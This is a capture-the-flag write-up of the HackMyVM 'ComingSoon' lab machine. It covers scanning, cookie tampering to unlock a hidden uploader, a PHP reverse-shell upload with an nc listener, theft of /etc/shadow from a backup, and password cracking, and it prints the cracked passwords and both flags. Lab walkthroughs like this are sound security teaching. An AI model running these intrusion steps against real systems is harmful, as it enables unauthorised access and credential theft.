# HackMyVM - ComingSoon (Easy) Writeup

## Machine Information

| Category         | Details    |
| ---------------- | ---------- |
| Platform         | HackMyVM   |
| Machine          | ComingSoon |
| Difficulty       | Easy       |
| Operating System | Linux      |

---

# Enumeration

## Identifying the Target IP Address

Unlike most HackMyVM machines, the IP address is not displayed when the machine starts. To identify the target, we can use `netdiscover` on our network interface.

```bash
netdiscover -i eth1
```

This discovers the target machine with the following IP address:

```text
192.168.56.108
```

![Netdiscover identifying target IP](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q1.png)

---

# Port Scanning

## Full TCP Port Scan

The first step is to identify all open TCP ports using Nmap.

```bash
nmap -p- 192.168.56.108
```

### Results

```text
22/tcp open  ssh
80/tcp open  http
```

Only two ports are exposed:

* SSH (22)
* HTTP (80)

![Nmap all ports scan](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q2.png)

---

## Service and Version Detection

To gather additional information about the exposed services, perform a version detection scan.

```bash
nmap -sC -sV 192.168.56.108
```

### Results

```text
22/tcp OpenSSH 8.4p1 Debian
80/tcp Apache httpd 2.4.51
```

The HTTP service hosts a simple "Coming Soon" webpage.

![Nmap service enumeration](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q3.png)

---

# Web Enumeration

Browsing to the website reveals only a simple landing page with no obvious functionality or login page.

Since nothing interesting is immediately visible, directory and file fuzzing is the next logical step.

![Coming Soon webpage](q4)

---

## Directory & File Fuzzing

Using Gobuster:

```bash
gobuster dir \
-u http://192.168.56.108 \
-w /usr/share/wordlists/dirb/common.txt
```

Interesting files discovered:

```text
.htaccess (403)
notes.txt (200)
```

The `notes.txt` file immediately stands out.

![Gobuster results](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q6.png)

---

# Discovering Developer Notes

Visiting:

```
http://192.168.56.108/notes.txt
```

reveals the following note:

```text
Dave,

Last few jobs to do...

Set ssh to use keys only (passphrase same as the password)

Just need to sort the images out:
resize and scp them or using the built-in image uploader.

Test the backups and delete anything not needed.

Apply an https certificate.

Cheers,

Webdev
```

From this note we learn several important details:

* A built-in image uploader exists.
* Backup files are present.
* SSH uses key authentication.
* HTTPS has not yet been configured.

The mention of an image uploader becomes our primary attack vector.

![Contents of notes.txt](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q5.png)

---

# Discovering the Hidden Upload Feature

Although the note mentions an uploader, the webpage does not display one.

To investigate further, inspect the HTTP response headers.

```bash
curl -I http://192.168.56.108
```

Response:

```text
Set-Cookie:
RW5hYmxlVXBsb2FkZXIK=ZmFsc2UK
```

The cookie appears to be Base64 encoded.

Decode the cookie name:

```bash
echo "RW5hYmxlVXBsb2FkZXIK" | base64 -d
```

Output:

```text
EnableUploader
```

Decode the cookie value:

```bash
echo "ZmFsc2UK" | base64 -d
```

Output:

```text
false
```

This indicates the application stores whether uploading is enabled directly inside a client-side cookie.

![HTTP response showing cookie](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q8.png)

---

# Enabling the Upload Functionality

By modifying the cookie value from:

```text
false
```

to

```text
true
```

using the browser's developer tools, the hidden upload feature becomes visible after refreshing the page.

This demonstrates insecure client-side authorization, where access control is enforced using a value that the user can modify.

![Editing the cookie in browser developer tools](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q10.png)

![Image upload option visible after cookie modification](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q11.png)

---

# Initial Access

With the upload functionality enabled, generate a PHP reverse shell (for example, the PentestMonkey PHP reverse shell) and save it as:

```
shell.phtml
```

Start a listener:

```bash
nc -lvnp 4444
```

Upload the reverse shell through the image uploader and execute it to obtain a shell on the target system.

![Uploading the reverse shell](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q12.png)

![Reverse shell connection received](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q13.png)

---

# Stabilizing the Shell

Upgrade the shell into a fully interactive terminal.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell:

```bash
Ctrl + Z
```

Fix the terminal:

```bash
stty raw -echo
fg
```

Set the terminal type:

```bash
export TERM=xterm
```

The shell is now fully interactive.

![Interactive shell stabilization](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q13.png)

---

# Local Enumeration

During enumeration, a backup archive is discovered inside:

```text
/var/backups/
```

Since direct modification is not allowed, copy it to `/tmp`.

```bash
cp backup.tar.gz /tmp/
```

Extract the archive for analysis.

![Copying the backup archive](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q15.png)

---

# Backup Analysis

The extracted archive contains sensitive system files, including:

* `/etc/passwd`
* `/etc/shadow`

This provides offline password hashes for cracking.

![Extracted backup contents](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q15.png)

---

# Cracking User Credentials

Extract the hash for `scpuser` and use John the Ripper.

```bash
john hash \
--wordlist=/usr/share/wordlists/rockyou.txt \
--format=crypt
```

Recovered password:

```text
tigger
```

![John cracking the user password](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q16.png)

---

# User Flag

Log in as `scpuser` using SSH.

```bash
ssh scpuser@192.168.56.108
```

Password:

```text
tigger
```

Retrieve the user flag.

```text
HMV{user:comingsoon.hmv:58842fc1a7}
```

---

# Privilege Escalation

Inside the user's home directory, an interesting file named `.oldpasswords` is discovered.

Contents:

```text
Previous root passwords

Incredibles2
Paddington2
BigHero6
101Dalmations
```

This suggests the administrator follows a naming pattern based on animated movie titles.

![Contents of .oldpasswords](https://github.com/naval0505/HackMyVM/blob/7e79a31923a1131335cf946bbe68e10efaf2142e/ComingSoon%20-%20HackMyVM%20Machine%20Writeup/images/q17.png)

---

# Offline Root Password Cracking

The backup archive also contains the root password hash.

Based on the observed naming pattern, create a custom wordlist containing Disney and Pixar movie names.

Run John the Ripper:

```bash
john hash2 \
--wordlist=pass.txt \
--format=crypt
```

Recovered password:

```text
ToyStory3
```


# Root Access

Switch to the root account.

```bash
su root
```

Password:

```text
ToyStory3
```

Retrieve the final flag.

```bash
cat /root/root.txt
```

Output:

```text
HMV{root:comingsoon.hmv:2339dc81ca}
```

Machine successfully rooted.

---

# Attack Path

```
Port Scan
      │
      ▼
notes.txt
      │
      ▼
Hidden Upload Feature
(Client-side Cookie Manipulation)
      │
      ▼
Upload PHP Reverse Shell
      │
      ▼
Reverse Shell (www-data)
      │
      ▼
Backup Archive
      │
      ▼
Extract /etc/shadow
      │
      ▼
Crack scpuser Password
      │
      ▼
SSH Access
      │
      ▼
.oldpasswords
      │
      ▼
Extract Root Hash
      │
      ▼
Custom Disney Wordlist
      │
      ▼
Crack Root Password
      │
      ▼
Root Shell
```

---

# Vulnerabilities Identified

* Sensitive developer notes exposed to the public.
* Client-side authorization implemented using editable cookies.
* Hidden functionality accessible through cookie manipulation.
* Unrestricted file upload leading to Remote Code Execution.
* Sensitive backup archives accessible by a low-privileged user.
* Password hashes exposed through backups.
* Weak and predictable passwords.
* Password reuse and predictable naming patterns.

---

# MITRE ATT&CK Mapping

| Technique                         | ID        |
| --------------------------------- | --------- |
| Active Scanning                   | T1595     |
| File and Directory Discovery      | T1083     |
| Exploit Public-Facing Application | T1190     |
| Command and Scripting Interpreter | T1059     |
| Archive Collected Data            | T1560     |
| Credentials from Password Stores  | T1555     |
| Password Cracking                 | T1110.002 |
| Valid Accounts                    | T1078     |
| Privilege Escalation              | T1068     |

---

# Conclusion

This machine demonstrates how multiple low-severity issues can be chained together into a complete system compromise. An exposed developer note, insecure client-side authorization, unrestricted file uploads, poorly protected backups, and predictable passwords collectively allowed an attacker to progress from unauthenticated access to full root privileges. Proper authorization checks, secure file upload handling, least-privilege permissions, backup protection, and strong password policies would have prevented the attack chain at multiple stages.
